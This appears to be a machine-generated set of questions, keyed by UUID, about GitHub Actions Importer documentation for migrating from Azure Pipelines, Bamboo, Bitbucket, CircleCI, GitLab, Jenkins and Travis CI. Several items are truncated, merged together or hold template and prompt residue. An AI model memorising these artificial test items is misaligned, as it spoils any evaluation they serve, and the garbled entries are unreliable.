"b33c16c2-610e-4337-9b5b-8d4745e26a8c": "What is the relationship between the `$(Build.DefinitionId)` and `$(Build.DefinitionName)` variables in the context information", "9717a7a7-f753-4653-b467-10acca716c76": "What is the difference between the `$(Agent.ReleaseDirectory)` and `$(Agent.RootDirectory)` variables in the context information", "5a5d622d-942e-4954-a901-4e410c6f0106": "What is the distinction between the `$(Agent.ToolsDirectory)` and `$(Agent.WorkFolder)` variables in the context information", "22fc4521-a52a-42bf-8b8e-b7c90e9c12a2": "What is the significance of the `$(Build.ArtifactStagingDirectory)` variable in the context information", "5e319927-ff5e-4c99-9333-4c5301844681": "What is the purpose of the `$(Agent.WorkFolder)` variable in the context information", "5044268b-ac81-44ed-9a6e-6f4bab09c2bb": "What is the value of the variable `endraw` in the first line of the provided context information", "60ed9b1e-8c0d-4685-8978-1595f8c88dc6": "What is the meaning of the `$(Build.PullRequest.TargetBranch)` variable in the context information", "3a747e57-abd0-46a9-a20b-ca14407aa83b": "What is the name of the repository being used in this build process, and where can it be found on GitHub?", "fb1169a7-7e7f-422d-820c-45462fd57d7f": "What is the relationship between the user who initiated the build process and the GitHub actor mentioned in the context information", "3bdc2fc9-da12-4259-a188-3e36441835e0": "What is the relationship between the variables $(Release.DefinitionId) and $(Release.DefinitionName) in the context provided", "8ad83c97-d5f9-4bbd-85e7-da00407d9a86": "What is the connection between $(Release.RequestedFor) and $(Release.Deployment.RequestedFor) in the context information", "4a6b12d5-55da-4d8d-ae1b-89c93afac239": "What is the role of $(System.HostType) in the context provided", "d381e3ae-6b5f-4300-b4c8-415d696b5f0b": "How does the variable $(Release.EnvironmentName) differ from $(Release.EnvironmentId) in the given context", "e2613f30-1af8-4acf-9aee-2f78a80fc05b": "How does $(System.PullRequest.PullRequestId) relate to $(Release.P", "ab7e84e4-c399-4646-b4fd-e0e4aa44672d": "What is the significance of the variable $(Release.Reason) in the context provided", "b1db8e4c-4cd0-4c8a-9c27-b6950da63154": "What is the correlation between $(System.JobId) and $(System.JobName) in the context information", "0b4e188d-51f8-4e2a-b273-e1c767226e0d": "How does $(System.ArtifactsDirectory) differ from $(System.DefaultWorkingDirectory) in the given context", "8c0228ae-68a7-4792-bf19-00d3822c415b": "What is the value of the variable `$(System.PullRequest.PullRequestNumber)` in Azure DevOps and how is it different from the variable `$(System.PullRequest.SourceBranch)`", "bbd85715-b85b-457f-bac7-aac7e981cc4a": "How can we obtain the URL of the repository in Azure DevOps using the variable `$(System.TeamFoundationCollectionUri)` and what is the equivalent variable in GitHub Actions?", "0f0201f7-e46e-4632-8f6b-c93d294e3082": "How does {% data variables.product.prodname_actions %} handle dynamically generated YAML using `each` expressions? What are the caveats associated with this functionality", "d5404928-1103-451f-97b9-c3793545d918": "Which templates are supported by {% data variables.product.prodname_actions_importer %} in Azure Pipelines and {% data variables.product.prodname_actions %}? What is the status of these templates?", "001cbf42-24c7-4bbc-bf2b-d5d2bbd5b409": " How does {% data variables.product.prodname_actions_importer %} support variable templates in Azure Pipelines? Provide examples of supported and partially supported features.- What types of file path names can {% data variables.product.prodname_actions_importer %} extract templates with, and what conditions must be met for successful extraction? Provide examples of variable, parameter, and iterative expressions in file path names.", "c03935db-6eb8-4476-95a0-c8b746240211": "What is the difference in behavior between using a template with this parameter type under the `step` key versus using it under the `stage`, `deployment`, and `job` keys in GitHub Actions?", "1a3faf55-1b48-4be3-b060-aa7af2c1e3b6": "Can you summarize the parameter types supported for templates in GitHub Actions", "cd7a316a-3d24-4070-b398-961788134542": "How can I migrate my Bamboo projects and pipelines to GitHub Actions using {% data variables.product.prodname_actions_importer %}? What are the prerequisites and limitations of this process", "b64115e6-d5a7-4cbb-b08c-fffbe4812f2f": "What are the differences between trigger conditions and artifact storage in Bamboo and GitHub Actions when migrating using {% data variables.product.prodname_actions_importer %}? How can I handle disabled plans and jobs during the migration process?", "fb7752c7-ac8c-442c-9234-f290f60f8757": "Which Bamboo constructs must be migrated manually during the migration process from Bamboo to GitHub Actions, and why?", "2f052ca1-663a-4749-be02-25f00d542d48": "How are hanging build detection options transformed during the migration process from Bamboo to GitHub Actions, and what is the closest equivalent in GitHub Actions", "43982711-bf0f-43f0-97bb-9ac136522812": "What information is required to configure the {% data variables.product.prodname_actions_importer %} CLI command for Bamboo integration with GitHub", "7f039545-301f-4a12-a079-5db4c92b0a0e": "   a) GitHub and Bamboo   b) GitHub and Jenkins   c) Bamboo and Jenkins   d) GitHub, Bamboo, and Jenkins", "e2fde3a1-e129-40ab-98e3-fa6605c24a06": "   a) The URL for your GitHub instance   b) The URL for your Bamboo Server or Bamboo Data Center instance   c) The value of the {% data variables.product.pat_v1 %} for GitHub   d) The value of the {% data variables.product.pat_v1 %} for Bamboo2. Which CI providers can be configured using the {% data variables.product.prodname_actions_importer %} CLI command", "e7b9aa5e-c461-419d-b7c0-97694e846739": "What is the output format of the `", "44fc0900-4abf-4a72-8339-b487ac2a1066": "How can I update the container image for the {% data variables.product.prodname_actions_importer %} CLI using the `update` command in my terminal", "2cadecc4-e235-4f53-9c09-c116da41aabc": "What is the purpose of running the `audit` command in {% data variables.product.prodname_actions_importer %} and how can I generate a report summarizing the migration possibilities for my Bamboo organization", "eb071634-d683-4f02-a496-5dce94ed01b7": "How can I forecast potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in my Bamboo instance using the `forecast` command in {% data variables.product.prodname_actions_importer %}", "54982b43-a508-4c62-811c-bbe089c258b2": "How can I limit the forecast to specific plans and deployments environments in {% data variables.product.prodname_actions_importer %} when generating forecast reports", "085f6389-cf44-4db6-8f71-85568daae9e4": "How can I migrate a Bamboo build plan to GitHub Actions using the `gh actions-importer` tool? Provide step-by-step instructions and any necessary command-line arguments.2. What information can be found in the forecast report generated by the `gh actions-importer` tool when migrating a Bamboo pipeline to GitHub Actions? Provide examples of key terms and metrics that may appear in the report.", "508d5869-70e4-412a-810f-968634b6092a": "How can I perform a production migration of a Bamboo pipeline using the `migrate` command provided by the `gh actions-importer` tool? Please provide the necessary command syntax, replacing the placeholders with the appropriate values for my specific Bamboo pipeline and GitHub repository.2. How can I preview the conversion of my Bamboo deployment project to GitHub Actions using the `gh actions-importer dry-run` command? Please provide the necessary command syntax, replacing the placeholders with the appropriate values for my specific Bamboo deployment project and output directory.", "729b3c2b-a379-4a95-aad2-cc42554438ab": "How does the provided context information impact the overall structure and organization of the document", "450c9347-7398-4ed6-a457-5a488f3378a3": "Based on the context information provided, generate the following questions:1. How does the given context information affect the arrangement and layout of the document", "11c87bc6-c136-4466-8158-a71f94940164": "Can you summarize the key points presented in the context information provided", "d97ebf7e-6133-41b9-b7c8-cc7235a7c44b": "Can you condense the essential ideas presented in the context material?", "e5ee7725-1f43-49ee-892f-8fca6257c8af": "How can the `--source-file-path` argument be used with the `dry-run` or `migrate` subcommands in {% data variables.product.prodname_actions_importer %} to fetch pipeline contents from a specified source file path instead of the default Bamboo instance", "6917b0aa-41be-4000-8b32-b715ffd7ac45": "What is the format required for a YAML configuration file to be used with the `--config-file-path` argument in {% data variables.product.prodname_actions_importer %} for auditing a Bamboo instance?", "68c39ce5-a8d1-4767-b79d-b4c28ac39059": "How does the dname_actions_importer tool convert between Bamboo's and GitHub Actions' configuration formats? Provide specific examples of the Bamboo and GitHub Actions configuration elements that can be converted by this tool.2. What configuration elements in Bamboo and GitHub Actions are partially supported by the dname_actions_importer tool? Can you provide a list of these elements and explain why they are only partially supported?", "e46266e2-8520-4b85-b70f-411d9f36c1ac": "How does {% data variables.product.prodname_actions_importer %} convert default Bamboo environment variables to the closest equivalent in {% data variables.product.prodname_actions %}? Provide a detailed mapping table as per the context information provided.2. What are the supported Bamboo concepts and plugin mappings for {% data variables.product.prodname_actions_importer %} as mentioned in the context information? Please provide more information about the same from the given context.", "fe4d4cf3-46ea-451d-b03f-36d83eee40b2": "What is the URL of the repository where the code for this build is located, as represented by the variable `bamboo.planRepository..repositoryUrl` in the context provided?", "9800de73-4c18-4f4b-88da-a169d73f3277": "What is the value of the variable `bamboo.planRepository..branchName` in the context provided", "beffc6c5-baeb-466e-857d-a7644e048572": "How can the variables `github.job` and `github.workflow` be utilized in Bamboo tasks to provide context information", "d21559b1-01b0-4db2-a4c2-909b0a60f86c": "What is the significance of transforming unknown variables to `$env.` in Bamboo tasks, and how can this be addressed to ensure proper operation of the workflow?", "305f20ce-4117-4188-9b42-a6b343a8a9d8": "What are the prerequisites required to use {% data variables.product.prodname_actions_importer %} for migrating Bitbucket Pipelines to GitHub Actions?", "c69cdccf-9863-46da-a17b-69ed0f68a50d": "How can I migrate my Bitbucket Pipelines to GitHub Actions using the {% data variables.product.prodname_actions_importer %} tool? What are the limitations and manual tasks involved in this process", "bf8cee0f-bc6a-40fc-930a-19a16e956bb3": "What is the purpose of running the \"gh actions-importer configure\" command in the context provided", "8d0a7084-c166-4941-8805-e3e011c597ee": "How do you obtain the required credentials for configuring {% data variables.product.prodname_actions_importer %} when working with Bitbucket Pipelines and {% data variables.product.prodname_dotcom %}?", "822d233a-8b19-492d-aee8-485dd2ab3e3b": "What is the purpose of running the audit command in the {% data variables.product.prodname_actions_importer %} tool for Bitbucket, and how can it be executed? Provide an example command with placeholders for the workspace and project key.", "aec1cfce-8d4c-4b1b-87b9-6992d321e8f2": "How can the {% data variables.product.prodname_actions_importer %} `update` CLI command be used to ensure that the container image is updated to the latest version in {% data variables.product.prodname_registry %} {% data variables.product.prodname_container_registry %}", "82d72304-8d3f-4e85-a99b-aa9150074af7": "How can I forecast potential GitHub Actions usage for a specific Bitbucket workspace using the `forecast` command provided in the context information? Please provide the command syntax and any necessary parameters.2. How can I limit the forecast to a specific project within a Bitbucket workspace using the `forecast` command? Please provide the command syntax and any necessary parameters. Additionally, what metrics are included in the forecast report and how can they be interpreted?", "ede0c31f-0483-4a9e-b4e9-c676e5f99f7e": "How can I perform a dry run of migrating a Bitbucket pipeline to GitHub Actions using the gh actions-importer tool? Provide the necessary command and explain the purpose of the dry run.2. How can I migrate a Bitbucket pipeline to GitHub Actions using the gh actions-importer tool and open a pull request with the equivalent GitHub Actions workflow(s)? Provide the necessary command and explain the output of the command.", "e00ca29b-4197-42e7-b342-aa14ed4a9fba": "How can environment variables be used in {% data variables.product.prodname_actions_importer %} to connect to a Bitbucket instance? Provide a list of required environment variables and their respective scopes.2. What is the purpose of the `--source-file-path` and `--config-file-path` arguments in {% data variables.product.prodname_actions_importer %} and how can they be used during the dry-run, audit, and migrate subcommands? Provide examples of how to use these arguments in a command.", "5f80c400-f2c8-435d-af1a-04b3151057c6": "How can {% data variables.product.prodname_actions_importer %} be used to perform an audit on a Bitbucket instance using a configuration file? Provide an example command and explain the required format of the configuration file.2. What types of properties can {% data variables.product.prodname_actions_importer %} currently convert from Bitbucket to GitHub Actions, and provide examples for each?", "4dc7f053-9d88-43f8-88f1-4aeb00224404": "Which environment variable mapping is used by {% data variables.product.prodname_actions_importer %} to convert default Bitbucket environment variables to the closest equivalent in GitHub Actions, as listed in the context information provided?", "7e6ed19e-d6ba-46da-b731-ce2bcf832e7e": "Can you summarize the supported workflow events for GitHub Actions as listed in the context information provided", "ff532dfd-79c5-457e-817d-bb6f66cabbd1": "What is the value assigned to the variable `BITBUCKET_PR_ID` in the context information provided", "50eee16f-569c-4c94-bb21-79d9783e6c5b": "What is the value assigned to the variable `BITBUCKET_BUILD_NUMBER` in the context information provided", "48a12e0a-2949-4085-ad55-66d2c33ee6ed": "What is the value assigned to the variable `BITBUCKET_PIPELINE_UUID` in the context information provided", "c641d67f-d989-45d4-a7d4-7f37c9837da3": "What is the full name of the repository in the context information provided", "b9d8f894-d4f2-4bc3-9b85-61ceb59eafea": "What is the value assigned to the variable `BITBUCKET_EXIT_CODE` in the context information provided", "97fa4f48-e3ee-42e3-a5be-161736acc892": "What is the URL for cloning the repository using HTTP in the context information provided", "58122ab3-9d6e-4de2-8d92-b47c86de7392": "What is the value assigned to the variable `BITBUCKET_STEP_UUID` in the context information provided", "13fa0554-aaab-4386-bd33-c5a2c2ccc5ce": "What is the branch being used in the context information provided", "38a98e53-719d-4f02-be99-b58f34523bb9": "What is the URL for cloning the repository using SSH", "bd73f8eb-9a58-4904-8758-464967bb6721": "What is the value of the variable `BITBUCKET_PROJECT_KEY` in this context", "e4668144-05ba-489b-a983-b0c93da5cadb": "What is the purpose of the variable `BITBUCKET_SSH_KEY_FILE` in this context", "5bdde3c1-7657-4995-9735-afd63b4a6724": "Generate according to: raw %}                                  ||  `BITBUCKET_PROJECT_KEY`                 | {% raw %}`${{ github.repository_owner }}`{% endraw %}                          ||  `BITBUCKET_PROJECT_UUID`                | {% raw %}`${{ github.repository_owner }}`{% endraw %}                          ||  `BITBUCKET_STEP_TRIGGERER_UUID`         | {% raw %}`${{ github.actor_id }}`{% endraw %}                                  ||  `BITBUCKET_", "d6af4194-6815-4de9-af12-d548ff321304": "How can I migrate CircleCI pipelines to GitHub Actions using the GitHub Actions Importer tool? What are the prerequisites and limitations involved in this process", "c792a913-4dcf-489f-a82d-8c93af5392c3": "What manual tasks are required during the migration process from CircleCI to GitHub Actions using the GitHub Actions Importer tool, and which CircleCI constructs are not automatically migrated?", "e2326ea1-955f-4122-a6e7-48eeb5c56701": "What is the significance of entering the {% data variables.product.pat_generic_caps %} for GitHub and CircleCI, as well as the base URLs for GitHub and CircleCI, during the {% data variables.product.prodname_actions_importer %} `configure` CLI command?", "838211e2-890b-49cf-b441-d62ce6e56af4": "What is the purpose of running the {% data variables.product.prodname_actions_importer %} `configure` CLI command in the terminal, and what information is required to complete this step", "cdfa7439-6a17-45dd-abd5-f15ffc36fd72": "What is the \"forecast\" command in {% data variables.product.prodname_actions_importer %} and how can it be used to forecast potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in CircleCI? What terms are listed in the forecast report?", "f44fc644-88f0-49b6-9993-8a9fd30225fa": "How can the \"audit\" command in {% data variables.product.prodname_actions_importer %} be used to perform a high-level view of all projects in a CircleCI organization? What steps does it perform", "cded6a42-8374-4748-911f-b60f5a2dc35b": "What is the significance of the \"queue time\" and \"concurrent jobs\" metrics in the context of CircleCI pipelines, and how can they be used to optimize resource allocation and configuration?", "2d23f125-d07e-4c5a-8e28-35ec43c62bec": "How can the \"runner spent on a job\" metric be utilized to estimate the costs associated with {% data variables.product.prodname_dotcom %}-hosted runners for {% data variables.product.prodname_actions %}", "bd1d66c0-8911-4982-a3e8-33588b5a6ed5": "How can I migrate my CircleCI project to GitHub Actions using the {% data variables.product.prodname_actions_importer %} tool? Provide step-by-step instructions, including any necessary environment variables and command-line arguments.2. What is the purpose of the `GITHUB_ACCESS_TOKEN` and `CIRCLE_CI_ACCESS_TOKEN` environment variables when using {% data variables.product.prodname_actions_importer %} to migrate from CircleCI? How do I obtain these tokens?", "9b6f18d6-86c2-41ed-81eb-acfef100ac98": "What are the three environment variables that can be specified in a \".env.local\" file to be used by {% data variables.product.prodname_actions_importer %} during execution", "caf43c76-0716-486a-b201-9a8128441de5": "How can you provide multiple source files when running the \"forecast\" subcommand using {% data variables.product.prodname_actions_importer %}?", "77297d9c-f6d8-49f6-9b7e-7577515c0f9b": "How can {% data variables.product.prodname_actions_importer %} be used to perform a dry run of converting CircleCI pipelines to GitHub Actions? Please provide the necessary command and arguments.2. How can {% data variables.product.prodname_actions_importer %} be used to specify the repository for converted composite actions during the conversion process? Please provide the necessary command and arguments.", "67f89e2f-5c76-46fe-a8fa-807b8c130c75": "How can you use the `--config-file-path` argument with the `migrate` command in {% data variables.product.prodname_actions_importer %} to specify a configuration file containing a list of repositories and refs for reusable workflows or composite actions? Provide an example command.2. How can you use the `--include-from` argument with the `audit` subcommand in {% data variables.product.prodname_actions_importer %} to include a specific list of repositories in the audit of a CircleCI organization? Provide an example command and the required format for the repository list file.", "b002b61e-6fd7-423c-bd08-24989f2f3d07": "What is the difference between the `runs-on` and `jobs` concepts in CircleCI and how are they supported in {% data variables.product.prodname_actions %}", "be31de7a-6b47-46cd-a652-6d4443269438": "What is the difference between the `executors` and `orbs` concepts in CircleCI and how are they supported in {% data variables.product.prodname_actions %}", "bedf29c1-96b9-4b5d-b430-b67a79431e1a": "What is the difference between the `matrix` and `steps` concepts in CircleCI and how are they supported in {% data variables.product.prodname_actions %}", "48367015-e1a3-485a-814d-47ab97ba1202": "How can you define environment variables in Circle", "2027eb97-1b9d-46be-acee-0605296d6ea3": "How can you define parameters in CircleCI and how are they supported in {% data variables.product.prodname_actions %}", "9db4699b-c736-462e-b535-a49e1e756cc3": "How can you define triggers in CircleCI and how are they supported in {% data variables.product.prodname_actions %}", "4f43a125-1832-4792-be5e-1d55e01262cb": "What is the value of the environment variable `CIRCLE_PR_REPONAME` in this context", "4f6f4cc4-0ea6-4966-b696-2bf4d82d270a": "How can we obtain the SHA1 value of the current GitHub commit using CircleCI environment variables", "18f63b34-bae8-4bda-8999-dfc0f5870992": "How can we determine the name of the GitHub workflow being executed in this context", "1a79b635-8f14-4668-8ca9-7204f6ee05ac": "How can we obtain the number of the current GitHub run using CircleCI environment variables", "f24fd027-0a4c-4f2a-8785-1540427e1f3f": "What is the path to the current working directory being used by CircleCI", "2315c2a4-e8a8-484d-9783-798fb9dd645a": "What is the ID of the current CircleCI workflow", "9e2fee48-f0bb-4565-a3f3-efa79951e48c": "What is the location of the GitHub repository being used in this context", "f965453c-ae40-44ce-a7d4-8fdf1f75b4a7": "What is the name of the GitHub repository being used in this context", "d2f0491c-2760-473a-a8db-731fb073b630": "How can we determine the GitHub user who initiated the current CircleCI workflow", "f0f6f3a5-f57e-465a-aea1-085ab4cb277d": "What is the name of the GitHub organization associated with this repository", "508689c5-1501-44d2-a012-f8ffe611ba3d": "What are the limitations of migrating processes automatically from GitLab pipelines to GitHub Actions with GitHub Actions Importer?", "dc72b60f-b384-4f24-a764-60bfa48fe942": "How can I configure credentials for using GitLab and GitHub Actions Importer", "88ae0429-abcf-427e-83c2-a7ea5c089c2c": "What command should I run in my terminal to configure the {% data variables.product.prodname_actions_importer %} and provide it with the necessary information to connect to GitHub and GitLab? What values should I enter for each prompt?", "137ebd77-1472-4cea-ae14-54381fbb3a4f": "How can I obtain a GitLab personal access token with the \"read_api\" scope, and what should I do with it after creating it", "388d7cee-cd35-4ae9-8d95-770a455e88ae": "How can the \"audit\" command in {% data variables.product.prodname_actions_importer %} be used to perform a high-level view of all pipelines in a GitLab server? What steps does it perform and what information does it generate", "0a9efcf9-6f40-4380-9f48-01ca3c221c29": "What is required to use the \"forecast\" command in {% data variables.product.prodname_actions_importer %} to forecast potential {% data variables.product.prodname_actions %} usage? How does it compute metrics from completed pipeline runs in a GitLab server?", "7faf721f-5e31-40d5-8ced-9867f105c567": "What is the difference between the \"execution time\" and \"queue time\" metrics provided in the forecast report, and how can they be used to optimize the use of GitLab runners and {% data variables.product.prodname_actions %}?", "7893917e-f109-48a1-8a79-090cc39080d0": "How can the `gh actions-importer forecast` command be used to analyze the performance of GitLab pipelines, and what metrics are provided in the resulting forecast report", "084f15d3-169d-45e2-9a6f-25b4e57dd9f1": "How can I perform a dry run of migrating my GitLab pipelines to GitHub Actions using the gh actions-importer tool? Provide the command syntax and explain the purpose of the dry run.2. How can I migrate a specific GitLab pipeline to GitHub Actions using the gh actions-importer tool? Provide the command syntax and explain the output of the command.", "e6ec65a9-dde6-446c-843b-828a17b18915": "How can environment variables be used in {% data variables.product.prodname_actions_importer %} to connect to a GitLab instance? Provide a list of required environment variables and their respective functions.2. What optional argument can be used with the `forecast`, `dry-run`, or `migrate` subcommands in {% data variables.product.prodname_actions_importer %} to specify a source file path instead of fetching pipeline contents from source control by default?", "642a3631-a14c-484b-bc87-517d7bf7ff5b": "How can the `--config-file-path` argument be used to specify which repository a converted reusable workflow should be migrated to in {% data variables.product.prodname_actions_importer %}?", "690de049-c211-47a0-9bde-40f766bf5d21": "How can the `--config-file-path` argument be used in {% data variables.product.prodname_actions_importer %} to perform an audit or dry run, and what format should the configuration file follow for GitLab instances", "e27a43f0-db79-4a89-851b-3e7f781791ea": "How can I use the YAML file provided to the `--config-file-path` argument to determine the repository that converted reusable workflows are migrated to, when running the `migrate` command with {% data variables.product.prodname_actions_importer %}", "a38228c9-5753-4b61-b562-f767df14bdbd": "What type of properties can {% data variables.product.prodname_actions_importer %} currently convert from GitLab pipeline syntax, and how does it align with GitHub Actions? (Provide examples from the table provided.)", "d8fb1b92-cea1-43c9-9274-1b4c034bda49": "How can you define the variables for a specific job in a workflow using GitHub Actions", "623d6b28-522e-4a39-b3c3-68b6d00949e4": "What is the syntax for specifying the default behavior of a workflow in GitHub Actions", "ed78d72c-4179-4e53-97c0-99b26ddf2cbd": "How can you specify the tags for a specific run in a workflow using GitHub Actions", "992ad113-75e2-48f2-9484-3ebe70cfd490": "How can you specify the environment for a specific job in a workflow using GitHub Actions", "9cbf629a-13bc-43df-af9b-9acda8012fe0": "How can you define the stages for a workflow using GitHub Actions", "5e28718e-2d14-4436-86ac-6bc1cc4f56da": "How can you specify the timeout for a specific job in a workflow using GitHub Actions", "b7208a92-8684-497a-ac25-0b10980b8625": "How can you define the steps for a specific job in a workflow using GitHub Actions", "152cddc1-14b9-48e6-a1da-f0f54d8707b0": "How can you specify the resources for a specific job in a workflow using", "9c681a38-3f2c-420c-b4a7-b79360a7c151": "How can you configure the concurrency limit for a specific job in a workflow using GitHub Actions", "078657f3-185e-42ca-ab06-6a44645864d3": "How does {% data variables.product.prodname_actions_importer %} convert GitLab environment variables to their closest equivalents in {% data variables.product.prodname_actions %}? Provide an example.2. What is the difference between `CI_COMMIT_REF_NAME` and `CI_COMMIT_REF_SLUG` in GitLab environment variables? How can we access the commit SHA and branch name in {% data variables.product.prodname_actions %}?", "5044c478-83eb-4d2e-a7f9-b5d9c2fcbdd9": "How can you determine whether the current job was triggered manually or through a workflow dispatch", "3b34f715-fd6d-4b13-9553-7c86a93cfa92": "How many jobs are currently being executed in this pipeline", "c0a6429e-75b9-438a-9c59-df604c8a0f91": "What is the ID of the current pipeline", "3b474ed6-8265-45bf-ace3-1e5040f5c324": "What is the value of the variable `CI_JOB_ID` in the current context", "3cf33e6a-c598-4df5-a3d2-34223e155e3a": "What is the status of the current job", "8bad11bb-acf5-4df8-87f1-7ec69e6c0087": "What is the URL to access the current job's run details", "9efa7b14-be3c-433e-ac25-963e5188a8a0": "What is the name of the current job", "ca11b734-8f2a-4de7-be93-7897d09fc52a": "How many jobs are being executed in total as part of this pipeline", "1b8fa083-55be-42b1-b618-2b39fba0b114": "Is the current pipeline triggered by a GitHub action?", "10fe3507-16f3-4ec0-8be5-f49595c9cba3": "What is the source of the current pipeline", "dd9522b8-756d-4156-8f4c-76b6f4a1852b": "What is the URL to clone the repository being worked on as specified by the variable `CI_REPOSITORY_URL`", "a937b889-8aea-421d-9f4b-e13ad72156b9": "How can I access the repository specified by the variable `CI_REPOSITORY_URL`", "08995d44-e4e6-44ee-914a-1e453b1261e7": "What is the namespace of the repository being worked on as specified by the variable `CI_PROJECT_ROOT_NAMESPACE`", "0a589371-ce96-44cd-ab0c-e1ca8ec769b2": "What is the URL of the GitHub server where the actions are being executed as specified by the variable `CI_SERVER_URL`", "acc418e6-82f1-4983-a490-35450f41040e": "What is the name of", "11be3ac8-14af-40e7-b6a6-a2847dc50507": "What is the path to the project being worked on as specified by the variable `CI_PROJECT_PATH`", "3a126fff-597f-4784-80d6-10014553a86b": "What is the name of the repository being worked on as specified by the variable `CI_PROJECT_NAME`", "c35540a8-7dbe-45da-96c8-58194b5f9000": "What is the value of the variable `CI_PROJECT_URL` in the context provided", "0528f21e-5055-4d0a-8112-3b99cc8b07c2": "How can you obtain the ID of the merge request being triggered in the context provided?", "8aa7721f-63d3-4a5e-8067-a491f1dd7499": "What is the value of the variable `GITLAB_USER_LOGIN` in the provided context information", "e1b0ba64-798a-4b44-b80a-1c1e574215db": "What is the SHA value for the source branch of the merge request being tested in this context", "b7e7aaa0-b943-4dde-bd7e-305c7d587305": "What is the name of the branch that the merge request's source code is being merged into in this context", "e0a425a1-938e-4c80-baa0-66f6e664dffd": "What is the path to the merge request's source branch in this context", "3bf3ee39-7ec6-48ec-a2b0-fb1a735f150b": "What is the path to the URL for the project", "4c751c48-860c-47a7-84ec-4ea4b51ce9a3": "What is the path to the project containing the merge request being tested in this context", "a0c11d6b-5e9d-4894-a22e-c137b7eaf648": "What is the unique identifier for an external pull request in this context", "80028626-eec2-484d-a00b-3b6b243b0e94": "What is the path to the project containing the merge request's source code in this context", "a1776929-c6f1-4a8c-b4aa-f694c04c8663": "What is the URL for the project containing the merge request being tested in this context", "b0ab9909-992f-4bd8-895a-495985ceda6d": "What is the path to the URL for the project containing the merge request being tested in this context", "bb181f39-9d22-4d5b-bee4-b38dd5a71a28": "What is the title of the merge request being tested in this context", "39ba60dd-5f9b-41ef-94e2-25764e728c3a": "What is the value of `CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_SHA` in the context provided", "63bdd9b6-2605-44e9-9917-3f527a076a98": "How can I obtain the value of `CI_EXTERNAL_PULL_REQUEST_TARGET_BRANCH_NAME` in the context provided?", "97f5f04f-ee34-4775-aaf1-1fb9f7843a04": "What credentials do I need to configure in order to use the GitHub Actions Importer tool for migrating from Jenkins to GitHub Actions? How do I create these credentials and where should I save them for later use?", "cf60f0ca-0b62-4704-810c-8726839774f2": "How can I migrate my Jenkins pipelines and jobs to GitHub Actions workflows using the GitHub Actions Importer tool? What are the prerequisites and limitations of this process", "1f148b49-1c5f-42da-8923-390e24b1e802": "How do you update the container image for the \"ghcr.io/actions-importer/cli\" repository using the \"gh actions-importer update\" command in the terminal?", "9034d2d0-dd1c-49f7-8d80-a8b1e773ccd7": "What is the purpose of running the \"gh actions-importer configure\" command in the terminal", "f0fb2674-7ab9-4f0c-87a3-756f8b714cf9": "How can the `audit` command in {% data variables.product.prodname_actions %} be used to analyze the migration potential of pipelines in a Jenkins server", "7734329d-fc46-42e3-b9a7-4ae3f491dd92": "What is required to run the `forecast` command in {% data variables.product.prodname_actions %} against a Jenkins instance, and what plugin must be installed for this purpose?", "a5d355a5-fb40-45f3-99ec-3257df8479de": "How can I generate a forecast report for my Jenkins pipeline using the actions-importer tool? Provide step-by-step instructions and explain the key metrics included in the report.2. How can I perform a dry-run migration of my Jenkins pipeline to a GitHub Actions workflow using the actions-importer tool? Walk me through the process and explain what a dry-run does.", "4a170b6e-d762-4707-92f8-89efad685012": "How can I migrate my Jenkins pipeline to GitHub Actions using the {% data variables.product.prodname_actions_importer %} tool? Provide step-by-step instructions and any necessary command-line arguments.2. Can I preview the converted workflows before performing a production migration? If so, how can I do this using the {% data variables.product.prodname_actions_importer %} tool? What command-line arguments should I use? Where can I view the converted workflows and logs?", "542115f1-e20d-42d6-bee5-ca9018502838": "What are the environment variables required by {% data variables.product.prodname_actions_importer %} to connect to a Jenkins instance", "2cc112fd-5c0c-4624-af4b-2039137a147c": "How can you use the `--source-file-path` argument with the `forecast`, `dry-run`, or `migration` subcommands in {% data variables.product.prodname_actions_importer %}?", "8a725406-085e-4988-b14c-4fc3a105215d": "How can the \"--config-file-path\" argument be used with the \"audit\", \"dry-run\", and \"migrate\" subcommands in {% data variables.product.prodname_actions_importer %}? Provide an example of using this argument with the \"audit\" subcommand.2. How can {% data variables.product.prodname_actions_importer %} be used to perform a dry run of a Jenkins pipeline using a specified source file? Provide an example command using the \"dry-run\" subcommand.", "49acd9a8-1496-4319-9d5f-e35dd63a2d94": "How does the conversion process of the pe of properties {% data variables.product.prodname_actions_importer %} differ for Freestyle pipelines and Jenkinsfile pipelines? Provide specific examples of supported syntax for each type of pipeline.2. What Jenkins plugins are currently supported for converting Freestyle pipelines to GitHub Actions using the `github/gh-actions-importer` repository?", "d6089c41-f04b-4578-ba00-204372184b17": "How does {% data variables.product.prodname_actions_importer %} convert default Jenkins environment variables to their closest equivalents in {% data variables.product.prodname_actions %}? Provide a list of the corresponding variables and their equivalents.2. What is the URL to access a specific run in {% data variables.product.prodname_actions %}? Provide the syntax to construct the URL using the necessary variables.", "0e158371-438b-4b86-aeb3-596252a2334f": "What languages are supported by the GitHub Actions Importer when transforming Travis CI project languages? How does it add build tools and a default build script to transformed workflows? What happens if no language is explicitly declared?", "32103c97-11a6-49be-9336-bec1fd2bb14a": "How can I migrate my Travis CI pipelines to GitHub Actions using the GitHub Actions Importer? What are the prerequisites and limitations involved in this process", "c98b77af-4589-4938-98f9-f6c1b8e8f140": "How can I create a Travis CI API access token and what information do I need to provide during the configuration process for the {% data variables.product.prodname_actions_importer %} CLI command", "ec07a217-bec3-4e98-92bc-2fc3fbc1e216": "What is the purpose of entering the value of a GitHub personal access token (PAT) and a Travis CI API access token during the configuration process for the {% data variables.product.prodname_actions_importer %} CLI command? Provide an explanation for each token and the specific context in which they are used.", "0fe848f7-f036-492c-b599-3f5e887a3416": "What is the purpose of running the {% data variables.product.prodname_actions_importer %} `audit` command for a Travis CI server, and how can I generate a report summarizing the migration possibilities using this command", "92ef58ef-da0b-4aba-88b3-867be45a5e84": "How can I update the container image using the {% data variables.product.prodname_actions_importer %} CLI command in my terminal", "5a8a7c90-a999-4bd9-b61d-bb23343854c6": "How can I forecast potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in my Travis CI server using the {% data variables.product.prodname_actions_importer %} `forecast` command", "9c32d8d6-a8ad-4150-bffa-d7c1730eafb3": "What is the significance of the \"queue time\" metrics in Travis CI, and how can they be used to determine the number of runners required for a pipeline?", "6233e3a6-d3cd-47bb-a8c7-ed150c7322d3": "How can the \"job count\" metric be utilized to estimate the cost of using {% data variables.product.prodname_dotcom %}-hosted runners in {% data variables.product.prodname_actions %}", "41c48a1e-5f07-46f9-85ca-7271c94f0c6a": "How can you use the 